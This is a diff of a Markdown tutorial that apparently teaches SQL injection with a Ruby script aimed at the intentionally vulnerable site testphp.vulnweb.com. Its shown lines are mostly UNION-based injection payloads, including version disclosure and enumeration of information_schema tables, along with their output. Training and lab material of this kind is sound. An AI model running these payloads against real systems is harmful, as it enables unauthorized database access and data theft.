@@ -34,12 +34,11 @@ puts ""
 ```
 
 
-I've commented the line `puts response.body.gsub(/<.*?>/, '').strip` and added a custom one for regex for our target
+> I've commented the line `puts response.body.gsub(/<.*?>/, '').strip` and added a custom RegEx to fix our target outputs.
 
 
 
-
-Let's to test it as we exploiting it
+Let's to test it in action
 
 ```
 ruby sqli-basic.rb "testphp.vulnweb.com" "-1 UNION ALL SELECT NULL,NULL,NULL,NULL#" | grep -i -e warning -e error
@@ -51,7 +50,8 @@ ruby sqli-basic.rb "testphp.vulnweb.com" "-1 UNION ALL SELECT NULL,NULL,NULL#" |
 ruby sqli-basic.rb "testphp.vulnweb.com" "-1 UNION ALL SELECT NULL,@@VERSION,NULL#"
 # => artist: 5.1.73-0ubuntu0.10.04.1
 
-
+ruby sqli-basic.rb "testphp.vulnweb.com" "-1 UNION ALL SELECT NULL,GROUP_CONCAT(table_name),NULL FROM information_schema.tables#" 
+# => artist: CHARACTER_SETS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS,COLUMN_PRIVILEGES,ENGINES,EVENTS,FILES,GLOBAL_STATUS,GLOBAL_VARIABLES,KEY_COLUMN_USAGE,PARTITIONS,PLUGINS,PROCESSLIST,PROFILING,REFERENTIAL_CONSTRAINTS,ROUTINES,SCHEMATA,SCHEMA_PRIVILEGES,SESSION_STATUS,SESSION_VARIABLES,STATISTICS,TABLES,TABLE_CONSTRAINTS,TABLE_PRIVIL
 ```
 
 
